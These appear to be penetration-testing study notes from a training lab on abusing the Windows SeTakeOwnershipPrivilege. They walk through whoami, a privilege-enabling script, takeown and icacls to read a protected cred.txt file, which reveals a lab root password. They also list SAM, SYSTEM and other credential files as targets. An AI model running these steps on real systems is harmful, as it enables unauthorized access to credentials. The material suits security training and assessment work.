## Overview

`SeTakeOwnershipPrivilege` grants a user the ability to take ownership of any **securable object**.

Securable objects can include:

- Active Directory objects
- NTFS files and folders
- printers
- registry keys
- services
- processes

This privilege gives the user `WRITE_OWNER` rights over an object, meaning the user can change the owner inside the object's security descriptor.

Administrators are assigned this privilege by default.

> [!warning]
> It is rare to find this privilege assigned to a standard user, but service accounts may have it for operational tasks such as backups or VSS snapshots.

---

# Why SeTakeOwnershipPrivilege Matters

A user with `SeTakeOwnershipPrivilege` may be able to take ownership of sensitive objects and then modify permissions to access them.

Potential impact includes:

- reading sensitive files
- accessing credentials
- modifying configuration files
- enabling Remote Code Execution
- causing Denial of Service
- taking control of sensitive file shares
- abusing misconfigured Active Directory or GPO-controlled rights

This privilege may appear alongside other powerful rights, such as:

- `SeBackupPrivilege`
- `SeRestorePrivilege`
- `SeSecurityPrivilege`

These privileges may be assigned to service accounts to avoid granting full local administrator rights while still allowing granular control over backup, restore, auditing, or ownership operations.

---

# Group Policy Location

The privilege can be configured through Group Policy.

```text
Computer Configuration ⇾ Windows Settings ⇾ Security Settings ⇾ Local Policies ⇾ User Rights Assignment
```

Relevant policy:

```text
Take ownership of files or other objects
```

> [!important]
> This right should only be assigned to trusted users. A user with this privilege may be able to take ownership of sensitive files or objects and alter permissions.

---

# Abuse Scenario

Suppose we encounter a user with `SeTakeOwnershipPrivilege`.

This may happen because:

- the privilege was assigned directly
- the user is a service account
- the account performs backup-related tasks
- the right was granted through a misconfigured GPO
- an attacker abuses GPO permissions using a tool such as `SharpGPOAbuse`

In this situation, we may be able to take ownership of sensitive files and then grant ourselves access.

Example targets:

- password files
- SSH keys
- application configuration files
- private file share documents
- KeePass databases
- scripts containing credentials

---

# Operational Warning

Changing ownership is potentially destructive.

> [!warning]
> Taking ownership of important files can break applications, disrupt users, or make permissions difficult to restore.

Avoid taking ownership of critical live files unless explicitly authorized, such as:

```text
web.config
```

Changing ownership deep inside a directory tree can also be difficult to revert, especially if multiple directory permissions must be modified along the path.

> [!tip]
> In a client assessment, some clients may prefer that you document the ability to abuse the privilege without fully exploiting it.

---

# Method – Read a Restricted File

## Attack Flow

1. Check current privileges.
2. Enable `SeTakeOwnershipPrivilege` if it is disabled.
3. Identify a target file.
4. Check file or directory ownership.
5. Take ownership of the file.
6. Modify the file ACL.
7. Read or copy the file.
8. Revert ownership and permissions where possible.

---

# Step 1 – Review Current User Privileges

Check the current user's token privileges.

```powershell
whoami /priv
```

Example output:

```powershell
PS C:\htb> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                                              State
============================= ======================================================= ========
SeTakeOwnershipPrivilege      Take ownership of files or other objects                Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                                Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set                          Disabled
```

In this example, `SeTakeOwnershipPrivilege` is present but currently disabled.

---

# Step 2 – Enable SeTakeOwnershipPrivilege

The notes reference using privilege-enabling scripts to enable token privileges:
- https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1
- https://medium.com/@markmotig/enable-all-token-privileges-a7d21b1a4a77

```powershell
Import-Module .\Enable-Privilege.ps1
```

```powershell
.\EnableAllTokenPrivs.ps1
```

Check privileges again:

```powershell
whoami /priv
```

Example output:

```powershell
PS C:\htb> Import-Module .\Enable-Privilege.ps1
PS C:\htb> .\EnableAllTokenPrivs.ps1
PS C:\htb> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                              State
============================= ======================================== =======
SeTakeOwnershipPrivilege      Take ownership of files or other objects Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                 Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set           Enabled
```

> [!note]
> The privilege may need to be explicitly enabled in the current token before it can be used.

---

# Step 3 – Choose a Target File

Example target:

```text
C:\Department Shares\Private\IT\cred.txt
```

This scenario assumes:

- access to a company file share exists
- Public and Private directories are browsable
- some directories allow listing but deny file reads
- a potentially interesting file named `cred.txt` is discovered in an IT subdirectory

---

# Step 4 – Gather File Information

Use `Get-ChildItem` and `Get-Acl` to inspect the target.

```powershell
Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | Select Fullname,LastWriteTime,Attributes,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }}
```

Example output:

```powershell
PS C:\htb> Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | Select Fullname,LastWriteTime,Attributes,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }}

FullName                                 LastWriteTime         Attributes Owner
--------                                 -------------         ---------- -----
C:\Department Shares\Private\IT\cred.txt 6/18/2021 12:23:28 PM    Archive
```

If the owner is not shown, the current user may not have enough permissions to view the ownership details.

---

# Step 5 – Check Directory Ownership

Back up one level and check ownership of the containing directory.

```powershell
cmd /c dir /q 'C:\Department Shares\Private\IT'
```

Example output:

```powershell
PS C:\htb> cmd /c dir /q 'C:\Department Shares\Private\IT'

 Volume in drive C has no label.
 Volume Serial Number is 0C92-675B

 Directory of C:\Department Shares\Private\IT

06/18/2021  12:22 PM    <DIR>          WINLPE-SRV01\sccm_svc  .
06/18/2021  12:22 PM    <DIR>          WINLPE-SRV01\sccm_svc  ..
06/18/2021  12:23 PM                36 ...                    cred.txt
               1 File(s)             36 bytes
               2 Dir(s)  17,079,754,752 bytes free
```

In this example, the directory appears to be owned by a service account:

```text
WINLPE-SRV01\sccm_svc
```

---

# Step 6 – Take Ownership of the File

Use `takeown` to change ownership of the target file.

```powershell
takeown /f 'C:\Department Shares\Private\IT\cred.txt'
```

Example output:

```powershell
PS C:\htb> takeown /f 'C:\Department Shares\Private\IT\cred.txt'

SUCCESS: The file (or folder): "C:\Department Shares\Private\IT\cred.txt" now owned by user "WINLPE-SRV01\htb-student".
```

### Command breakdown

| Part | Purpose |
|---|---|
| `takeown` | Windows binary used to take ownership |
| `/f` | Specifies the target file or folder |
| `'C:\Department Shares\Private\IT\cred.txt'` | Target file |

---

# Step 7 – Confirm Ownership Changed

Check the owner again.

```powershell
Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | select name,directory,@{Name="Owner";Expression={(Get-ACL $_.Fullname).Owner}}
```

Example output:

```powershell
PS C:\htb> Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | select name,directory,@{Name="Owner";Expression={(Get-ACL $_.Fullname).Owner}}

Name     Directory                       Owner
----     ---------                       -----
cred.txt C:\Department Shares\Private\IT WINLPE-SRV01\htb-student
```

The current user is now the owner.

---

# Step 8 – Try to Read the File

Taking ownership does not always automatically grant read access.

```powershell
cat 'C:\Department Shares\Private\IT\cred.txt'
```

Example denied output:

```powershell
PS C:\htb> cat 'C:\Department Shares\Private\IT\cred.txt'

cat : Access to the path 'C:\Department Shares\Private\IT\cred.txt' is denied.
At line:1 char:1
+ cat 'C:\Department Shares\Private\IT\cred.txt'
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (C:\Department Shares\Private\IT\cred.txt:String) [Get-Content], UnauthorizedAccessException
    + FullyQualifiedErrorId : GetContentReaderUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetContentCommand
```

> [!important]
> Ownership and read permissions are separate. After taking ownership, you may still need to modify the ACL.

---

# Step 9 – Modify the File ACL

Use `icacls` to grant the current user full control over the target file.

```powershell
icacls 'C:\Department Shares\Private\IT\cred.txt' /grant htb-student:F
```

Example output:

```powershell
PS C:\htb> icacls 'C:\Department Shares\Private\IT\cred.txt' /grant htb-student:F

processed file: C:\Department Shares\Private\IT\cred.txt
Successfully processed 1 files; Failed processing 0 files
```

### Command breakdown

| Part | Purpose |
|---|---|
| `icacls` | View or modify file and directory ACLs |
| `'C:\Department Shares\Private\IT\cred.txt'` | Target file |
| `/grant` | Grant permissions |
| `htb-student:F` | Grant full control to `htb-student` |

---

# Step 10 – Read the File

After modifying the ACL, read the file.

```powershell
cat 'C:\Department Shares\Private\IT\cred.txt'
```

Example output:

```powershell
PS C:\htb> cat 'C:\Department Shares\Private\IT\cred.txt'

NIX01 admin

root:n1X_p0wer_us3er!
```

At this stage, the file can also be:

- opened through RDP
- copied to the attack system
- processed further depending on file type

Example follow-up:

```text
Crack a KeePass database password if the target file is a .kdbx file.
```

---

# Cleanup and Reporting

After modifying file ownership or ACLs, make every effort to revert changes.

Document:

- original owner, if known
- new owner applied
- ACL modifications
- commands used
- files accessed
- whether permissions were reverted
- any files copied from the system

> [!warning]
> If permissions or ownership cannot be reverted, clearly alert the client and document the change in the report appendix.

---

# When to Use This Technique

Use this technique when:

- `SeTakeOwnershipPrivilege` is present
- sensitive files are visible but unreadable
- other privilege escalation paths are blocked
- GPO abuse allows assigning this right to a controlled user
- file share enumeration reveals promising targets
- the target object is safe and authorized to modify

Avoid or get explicit approval when:

- the file is part of a live application
- ownership changes may break service behavior
- the directory tree is large or complex
- reverting changes will be difficult
- the target is business-critical

---

# Files of Interest

Local files of interest may include:

```text
c:\inetpub\wwwwroot\web.config
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software
%WINDIR%\repair\security
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
```

Other useful targets may include:

- `.kdbx` KeePass database files
- OneNote notebooks
- files named `passwords.*`
- files named `pass.*`
- files named `creds.*`
- scripts
- application configuration files
- virtual hard disk files
- backup files
- deployment artifacts

---

# Practical Decision Tree

## Does the user have SeTakeOwnershipPrivilege?

Check:

```powershell
whoami /priv
```

If present but disabled, enable it using an authorized token privilege script.

---

## Is the target file visible but unreadable?

Gather file details:

```powershell
Get-ChildItem -Path '<target_file>' | Select Fullname,LastWriteTime,Attributes,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }}
```

Check directory ownership:

```powershell
cmd /c dir /q '<target_directory>'
```

---

## Can ownership be changed safely?

If yes, take ownership:

```powershell
takeown /f '<target_file>'
```

Then grant access:

```powershell
icacls '<target_file>' /grant <user>:F
```

Then read:

```powershell
cat '<target_file>'
```

---

## Can the change be reverted?

Before modifying sensitive files, consider whether you can restore:

- previous owner
- previous ACL
- application functionality
- original access state

If not, consider documenting the issue without exploitation.

---

# Troubleshooting

## Privilege is present but disabled

Enable token privileges and check again:

```powershell
Import-Module .\Enable-Privilege.ps1
.\EnableAllTokenPrivs.ps1
whoami /priv
```

---

## Owner field is blank

The current user may not have enough permission to view ownership details.

Try checking the parent directory:

```powershell
cmd /c dir /q '<target_directory>'
```

---

## Taking ownership succeeds but reading fails

Taking ownership does not guarantee read access.

Modify the ACL:

```powershell
icacls '<target_file>' /grant <user>:F
```

---

## `cat` returns access denied

Possible causes:

- ownership was not changed
- ACL was not modified
- wrong user was granted access
- file is locked
- path is incorrect
- command is running in the wrong context

---

## Target is a live application file

Avoid modifying it without explicit permission.

Example high-risk file:

```text
c:\inetpub\wwwwroot\web.config
```

Potential impact:

- application outage
- configuration corruption
- credential exposure
- unintended service behavior

---

# Command Reference

## Check current privileges

```powershell
whoami /priv
```

## Enable token privileges

```powershell
Import-Module .\Enable-Privilege.ps1
```

```powershell
.\EnableAllTokenPrivs.ps1
```

## Inspect target file

```powershell
Get-ChildItem -Path '<target_file>' | Select Fullname,LastWriteTime,Attributes,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }}
```

## Check directory owner with `dir /q`

```powershell
cmd /c dir /q '<target_directory>'
```

## Take ownership of a file

```powershell
takeown /f '<target_file>'
```

## Confirm ownership

```powershell
Get-ChildItem -Path '<target_file>' | select name,directory,@{Name="Owner";Expression={(Get-ACL $_.Fullname).Owner}}
```

## Grant full control to a user

```powershell
icacls '<target_file>' /grant <user>:F
```

## Read target file

```powershell
cat '<target_file>'
```

---

# Example Workflow

```powershell
whoami /priv
```

```powershell
Import-Module .\Enable-Privilege.ps1
.\EnableAllTokenPrivs.ps1
whoami /priv
```

```powershell
Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | Select Fullname,LastWriteTime,Attributes,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }}
```

```powershell
cmd /c dir /q 'C:\Department Shares\Private\IT'
```

```powershell
takeown /f 'C:\Department Shares\Private\IT\cred.txt'
```

```powershell
Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | select name,directory,@{Name="Owner";Expression={(Get-ACL $_.Fullname).Owner}}
```

```powershell
icacls 'C:\Department Shares\Private\IT\cred.txt' /grant htb-student:F
```

```powershell
cat 'C:\Department Shares\Private\IT\cred.txt'
```

---

# Key Takeaways

- `SeTakeOwnershipPrivilege` allows a user to take ownership of securable objects.
- Taking ownership gives control over the owner field, not automatic read access.
- After taking ownership, `icacls` may be needed to grant access.
- This privilege can expose sensitive files on local disks or file shares.
- Abuse may be possible through directly assigned rights or GPO abuse.
- Changing ownership or ACLs can be destructive and should be done carefully.
- Always attempt to revert ownership and permission changes.
- If reverting is not possible, document the change clearly in the report.

---

# Related Notes

- [[Windows Privilege Escalation]]
- [[Windows User Rights Assignment]]
- [[NTFS Permissions]]
- [[Access Control Lists]]
- [[icacls]]
- [[takeown]]
- [[SeBackupPrivilege]]
- [[SeRestorePrivilege]]
- [[SharpGPOAbuse]]
- [[File Share Enumeration]]

---

# Tags

#windows
#privilege-escalation
#setakeownershipprivilege
#takeown
#icacls
#ntfs
#acl
#file-permissions
#gpo-abuse
#file-shares
#sensitive-files
#pentesting